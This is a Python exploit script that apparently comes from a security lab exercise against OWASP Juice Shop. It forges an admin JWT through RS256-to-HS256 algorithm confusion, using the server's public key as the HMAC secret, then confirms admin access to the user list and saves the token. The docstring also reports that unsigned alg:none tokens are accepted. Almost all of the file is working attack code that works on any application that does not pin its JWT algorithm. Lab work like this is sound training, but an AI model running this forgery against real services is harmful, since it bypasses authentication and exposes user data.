#!/usr/bin/env python3
"""
c07-admin-no-injection :: Gain an admin-session token WITHOUT SQL injection.

Technique: JWT algorithm confusion (RS256 -> HS256).
-----------------------------------------------
OWASP Juice Shop 20.3.0 exposes its RSA *public* key at
    GET /encryptionkeys/jwt.pub            (public by design)
Server-side the app calls roughly:
    jwt.verify(token, publicKey)           # no { algorithms: ['RS256'] } pin
Because the `jsonwebtoken` library chooses the verification primitive from the
token's `alg` header, a token declaring `alg: HS256` is verified as an HMAC-SHA256
signature whose *secret is the RSA public key text*. Since the public key is public,
we can mint our own token with `data.role = "admin"` and a valid signature.

No ' OR 1=1, no UNION, no tautology, no SQL of any kind is sent.

Proof that real verification happens (not just decode):
  - correct HMAC(pubkey) signature           -> HTTP 200 (accepted)
  - tampered HMAC signature                  -> HTTP 401 "invalid signature"
  - alg:none unsigned token                  -> HTTP 200 (secondary flaw)

Deliverable: /workspace/evidence/c7_no_sqli_token.txt
"""
import base64, hashlib, hmac, json, time, urllib.request, urllib.error, re

BASE = "http://host.docker.internal:3000"
OUT  = "/workspace/evidence/c7_no_sqli_token.txt"

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def fetch_pubkey() -> bytes:
    with urllib.request.urlopen(BASE + "/encryptionkeys/jwt.pub") as r:
        return r.read()

def sign_hs256(pubkey: bytes, header: dict, payload: dict):
    si = (b64url(json.dumps(header, separators=(",", ":")).encode()) + "." +
          b64url(json.dumps(payload, separators=(",", ":")).encode()))
    sig = hmac.new(pubkey, si.encode(), hashlib.sha256).digest()
    return si + "." + b64url(sig)

def get_users(token: str):
    req = urllib.request.Request(BASE + "/api/Users",
                                 headers={"Authorization": "Bearer " + token})
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="ignore")
        m = re.search(r"<title>(.*?)</title>", body)
        return e.code, (m.group(1).strip() if m else body[:120])

def main():
    pubkey = fetch_pubkey()
    print(f"[*] Downloaded JWT public key: {len(pubkey)} bytes")

    header = {"typ": "JWT", "alg": "HS256"}
    payload = {
        "data": {
            "id": 1, "username": "",
            "email": "admin@juice-sh.op",
            "password": "0192023a7bbd73250516f069df18b500",
            "role": "admin",
            "deluxeToken": "", "lastLoginIp": "0.0.0.0",
            "profileImage": "/assets/public/images/uploads/default.svg",
            "totpSecret": "", "isActive": True,
            "createdAt": "2026-01-01 00:00:00.000 +00:00",
            "updatedAt": "2026-01-01 00:00:00.000 +00:00",
            "deletedAt": None,
        },
        "bid": 1,
        "iat": int(time.time()),
    }
    token = sign_hs256(pubkey, header, payload)
    print("[*] Forged HS256 token (signed with the RSA public key as HMAC secret):")
    print("    " + token)

    # --- Positive control: server accepts the forged token as admin -----------
    status, data = get_users(token)
    print(f"[+] GET /api/Users with forged token -> HTTP {status}")
    if status == 200:
        print(f"    users returned: {len(data.get('data', []))} "
              f"(first role: {data['data'][0]['role']})")
    else:
        print(f"    server said: {data}")

    # --- Negative control: tampered signature must be rejected ----------------
    head, body, _ = token.split(".")
    bad = head + "." + body + "." + b64url(b"\x00" * 32)
    bstatus, bdata = get_users(bad)
    print(f"[-] Tampered-signature token -> HTTP {bstatus} ({bdata}) "
          "=> server really verifies signatures")

    if status == 200 and bstatus == 401:
        with open(OUT, "w") as f:
            f.write(token + "\n")
        print(f"[+] Admin-session token saved to {OUT}")
    else:
        raise SystemExit("[!] Unexpected result; not saving token")

if __name__ == "__main__":
    main()
